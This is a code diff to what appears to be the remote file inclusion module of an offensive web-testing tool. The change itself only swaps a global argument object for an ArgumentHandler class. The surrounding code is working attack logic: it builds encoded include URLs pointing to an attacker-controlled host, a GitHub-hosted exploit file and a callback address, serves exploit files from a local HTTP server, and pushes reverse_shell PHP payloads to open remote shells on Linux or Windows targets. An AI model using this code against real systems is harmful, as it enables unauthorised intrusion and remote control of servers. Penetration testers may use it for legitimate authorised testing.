@@ -6,7 +6,7 @@ from random import randint
 
 from src.httpreqs import request
 from src.configs.config import rfi_test_port
-from src.utils.arguments import args
+from src.utils.arguments import ArgumentHandler
 from src.utils.args_check import scriptDirectory
 from src.servers.HTTPServer import serve_forever
 from src.configs import config
@@ -27,11 +27,12 @@ def random_with_N_digits(n):
 
 def test_rfi(url, post):
     """Test RFI"""
-    if args.verbose:
+    args = ArgumentHandler()
+    if args.args['verbose']:
         print(colors.blue("[i]") + " Testing remote file inclusion...")
 
     # Localhost RFI test
-    if args.lhost:
+    if args.args['lhost']:
         try:
             # Setup exploit serving path
             if os.access(scriptDirectory + os.sep + "src/exploits", os.R_OK):
@@ -48,43 +49,43 @@ def test_rfi(url, post):
             threading.Thread(target=serve_forever).start()
             rfiTest = []
             rfiTest.append(
-                f"http%3A%2F%2F{args.lhost}%3A{rfi_test_port}%2Fysvznc"
+                f"http%3A%2F%2F{args.args['lhost']}%3A{rfi_test_port}%2Fysvznc"
             )
             rfiTest.append(
-                f"http%3A%2F%2F{args.lhost}%3A{rfi_test_port}%2Fysvznc%00"
+                f"http%3A%2F%2F{args.args['lhost']}%3A{rfi_test_port}%2Fysvznc%00"
             )
             rfiTest.append(
-                f"http%3A%2F%2F{args.lhost}%3A{rfi_test_port}%2Fysvznc.gif"
+                f"http%3A%2F%2F{args.args['lhost']}%3A{rfi_test_port}%2Fysvznc.gif"
             )
             rfiTest.append(
-                f"http%3A%2F%2F{args.lhost}%3A{rfi_test_port}%2Fysvznc.png"
+                f"http%3A%2F%2F{args.args['lhost']}%3A{rfi_test_port}%2Fysvznc.png"
             )
             rfiTest.append(
-                f"http%3A%2F%2F{args.lhost}%3A{rfi_test_port}%2Fysvznc.jsp"
+                f"http%3A%2F%2F{args.args['lhost']}%3A{rfi_test_port}%2Fysvznc.jsp"
             )
             rfiTest.append(
-                f"http%3A%2F%2F{args.lhost}%3A{rfi_test_port}%2Fysvznc.html"
+                f"http%3A%2F%2F{args.args['lhost']}%3A{rfi_test_port}%2Fysvznc.html"
             )
             rfiTest.append(
-                f"http%3A%2F%2F{args.lhost}%3A{rfi_test_port}%2Fysvznc.php"
+                f"http%3A%2F%2F{args.args['lhost']}%3A{rfi_test_port}%2Fysvznc.php"
             )
 
             for test in rfiTest:
                 u, reqHeaders, postTest = request.prepareRequest(
-                    args.param, test, url, post
+                    args.args['param'], test, url, post
                 )
                 _, br = request.REQUEST(
                     u, reqHeaders, postTest, config.proxies, "RFI", "RFI"
                 )
                 if not br:
                     return
-                if args.quick:
+                if args.args['quick']:
                     return
         except:
             raise
 
     # Internet RFI test
-    if args.verbose:
+    if args.args['verbose']:
         print(colors.blue("[i]") + " Trying to include internet-hosted file...")
 
     pylds = []
@@ -104,24 +105,24 @@ def test_rfi(url, post):
         "https%3A%2F%2Fgithub.com%2Fhansmach1ne%2FLFImap%2Fblob%2Fmain%2Fsrc%2Fexploits%2Fexploit.png"
     )
 
-    if args.callback:
-        if not args.callback.startswith("http://"):
+    if args.args['callback']:
+        if not args.args['callback'].startswith("http://"):
             callbackTest = (
-                "http://" + args.callback + "%2F" + str(random_with_N_digits(5))
+                "http://" + args.args['callback'] + "%2F" + str(random_with_N_digits(5))
             )
         pylds.append(callbackTest)
 
     for pyld in pylds:
         try:
             u, reqHeaders, postTest = request.prepareRequest(
-                args.param, pyld, url, post
+                args.args['param'], pyld, url, post
             )
             _, br = request.REQUEST(
                 u, reqHeaders, postTest, config.proxies, "RFI", "RFI"
             )
             if not br:
                 return
-            if args.quick:
+            if args.args['quick']:
                 return
         except:
             raise
@@ -159,12 +160,13 @@ def prepareRfiExploit(payloadFile, temporaryFile, ip, port):
 
 def exploit_rfi(exploit, method, ip, port):
     """Exploit RFI"""
-    if args.f:
+    args = ArgumentHandler()
+    if args.args['f']:
         return
 
     url = exploit["GETVAL"]
     printInfo(ip, port, "php", "Remote File Inclusion")
-    if args.mode == "post":
+    if args.args['mode'] == "post":
         if exploit["OS"] == "linux":
             prepareRfiExploit(
                 config.webDir + os.path.sep + "/reverse_shell_lin.php",
@@ -174,7 +176,7 @@ def exploit_rfi(exploit, method, ip, port):
             )
             request.REQUEST(
                 url,
-                args.httpheaders,
+                args.args['httpheaders'],
                 exploit["POSTVAL"].replace(config.tempArg, "reverse_shell_lin_tmp.php"),
                 config.proxies,
                 "",
@@ -189,7 +191,7 @@ def exploit_rfi(exploit, method, ip, port):
             )
             request.REQUEST(
                 url,
-                args.httpheaders,
+                args.args['httpheaders'],
                 exploit["POSTVAL"].replace(config.tempArg, "reverse_shell_win_tmp.php"),
                 config.proxies,
                 "",
@@ -207,7 +209,7 @@ def exploit_rfi(exploit, method, ip, port):
         )
         request.REQUEST(
             url.replace(config.tempArg, "reverse_shell_win_tmp.php"),
-            args.httpheaders,
+            args.args['httpheaders'],
             "",
             config.proxies,
             "",
@@ -222,7 +224,7 @@ def exploit_rfi(exploit, method, ip, port):
         )
         request.REQUEST(
             url.replace(config.tempArg, "reverse_shell_lin_tmp.php"),
-            args.httpheaders,
+            args.args['httpheaders'],
             "",
             config.proxies,
             "",
